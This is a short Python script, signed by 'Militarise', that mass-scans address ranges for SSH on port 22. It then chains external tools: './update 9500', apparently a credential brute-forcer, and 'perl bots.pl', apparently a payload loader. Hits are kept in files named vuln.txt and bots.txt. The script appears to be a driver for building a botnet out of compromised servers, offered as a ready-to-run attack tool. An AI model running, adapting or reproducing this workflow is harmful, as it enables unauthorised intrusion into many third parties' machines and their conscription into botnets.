#Mass Scanner Created By Militarise

import time
import sys
import subprocess

start = int(input("Enter A Start Range :"))
end = int(input("Enter A End Range :"))
starttime = time.time()

print("Mass Scanner Started.")

for numb in range(int(start), int(end)):
	try:
		subprocess.call("rm bots.txt vuln.txt", shell=True)
		subprocess.call("./class 22 -a " + str(numb) + " -s 10 -i eth0", shell=True)
		subprocess.call("cat bios.txt | sort | uniq > mfu.txt",shell=True)
		subprocess.call("rm bios.txt",shell=True)
		subprocess.call("./update 9500",shell=True)
		subprocess.call("cat vuln.txt | grep -v DUP  >  bots.txt",shell=True)
		subprocess.call("perl bots.pl",shell=True)
		subprocess.call("rm vuln.txt",shell=True)
		subprocess.call("rm bots.txt",shell=True)
		print("Now Scanning Range " + str(numb))
	except:
		print("The Scanner Returned An Error, This Could Be Caused By Anything Such As A Keyboard Interupt")
